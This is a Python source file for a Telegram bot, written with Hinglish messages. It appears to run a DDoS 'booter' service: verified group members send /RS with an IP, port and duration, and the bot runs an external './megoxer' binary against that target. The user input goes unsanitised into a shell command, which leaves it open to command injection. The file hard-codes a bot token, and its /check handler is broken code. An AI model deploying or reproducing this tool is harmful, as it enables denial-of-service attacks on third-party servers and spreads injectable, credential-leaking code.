#!/usr/bin/python3
import telebot
import datetime
import time
import subprocess
import threading

# TELEGRAM BOT TOKEN
bot = telebot.TeleBot('8111473127:AAERRgnT8TW3fAw_cf_E2FM5zD8j4ae10k8')

# GROUP AND CHANNEL DETAILS
GROUP_ID = "-1002369239894"
CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
ADMINS = [7129010361]

# GLOBAL VARIABLES
active_attacks = {}  # Track active attacks per user
verified_users = set()
user_attack_count = {}

# FUNCTION TO CHECK IF USER IS IN CHANNEL
def is_user_in_channel(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

# SCREENSHOT VERIFICATION FUNCTION
def verify_screenshot(user_id, message):
    verified_users.add(user_id)
    bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
    bot.reply_to(message, "✅ SCREENSHOT VERIFIED! AB ATTACK KAR SAKTA HAI!")

# HANDLE SCREENSHOT SUBMISSION
@bot.message_handler(content_types=['photo'])
def handle_screenshot(message):
    user_id = message.from_user.id
    verify_screenshot(user_id, message)

# HANDLE ATTACK COMMAND
@bot.message_handler(commands=['RS'])
def handle_attack(message):
    user_id = message.from_user.id
    command = message.text.split()

    if message.chat.id != int(GROUP_ID):
        bot.reply_to(message, "🚫 YE BOT SIRF GROUP ME CHALEGA! ❌")
        return

    if not is_user_in_channel(user_id):
        bot.reply_to(message, f"❗ PEHLE CHANNEL JOIN KAR! {CHANNEL_USERNAME}")
        return

    if user_id not in verified_users:
        bot.reply_to(message, "❌ SCREENSHOT BHEJ BSDK, TABHI ATTACK LAGEGA!")
        return

    if user_id in active_attacks:
        bot.reply_to(message, "⚠️ EK TIME MAIN 1 HI ATTACK ALLOW HAI! PEHLE PURANA KHATAM HONE DE! /check ")
        return

    if len(command) != 4:
        bot.reply_to(message, "⚠️ USAGE: /RS <IP> <PORT> <TIME>")
        return

    target, port, time_duration = command[1], command[2], command[3]

    try:
        port = int(port)
        time_duration = int(time_duration)
    except ValueError:
        bot.reply_to(message, "❌ PORT AUR TIME NUMBER HONE CHAHIYE!")
        return

    if time_duration > 120:
        bot.reply_to(message, "🚫 120S SE ZYADA ALLOWED NAHI HAI!")
        return

    bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n🎯 `{target}:{port}`\n⏳ {time_duration}S", parse_mode="Markdown")

    # Mark attack as active
    active_attacks[user_id] = True  

    # Attack Execution
    def attack_execution():
        try:
            subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True, timeout=time_duration)
        except subprocess.CalledProcessError:
            bot.reply_to(message, "❌ ATTACK FAIL HO GAYA!")
        finally:
            bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
            verified_users.discard(user_id)  # Reset verification
            del active_attacks[user_id]  # Remove attack lock

    threading.Thread(target=attack_execution).start()

# ADMIN RESTART COMMAND (ONLY ADMINS)
@bot.message_handler(commands=['restart'])
def restart_bot(message):
    if message.from_user.id in ADMINS:
        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
        time.sleep(1)
        subprocess.run("python3 m.py", shell=True)
    else:
        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")

# ✅ /STATS Command - Shows Only Active Attacks
@bot.message_handler(commands=['check'])
def attack_stats(message):
    if not active_attacks:  # ✅ INDENTATION FIXED
        bot.reply_to(message, "📊 No Active Attacks Right Now!")
        return  # ✅ यह लाइन सही से इंडेंट होनी चाहिए

    now = datetime.datetime.now(IST)

    # ✅ खत्म हुए अटैक हटाओ
    for user_id in list(active_attacks.keys()):
        active_attacks[user_id] = [attack for attack in active_attacks[user_id] if attack[2] > now]
        if not active_attacks[user_id]:  
            del active_attacks[user_id]

    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"

    for user_id, attacks in active_attacks.items():
        stats_message += f"👤 **User ID:** `{user_id}`\n"
        for target, port, end_time in attacks:
            remaining_time = (end_time - now).total_seconds()
            stats_message += f"🚀 **Target:** `{target}`\n🎯 **Port:** `{port}`\n⏳ **Ends In:** `{int(remaining_time)}s`\n\n"

    bot.reply_to(message, stats_message, parse_mode="Markdown")

# START POLLING
bot.polling(none_stop=True)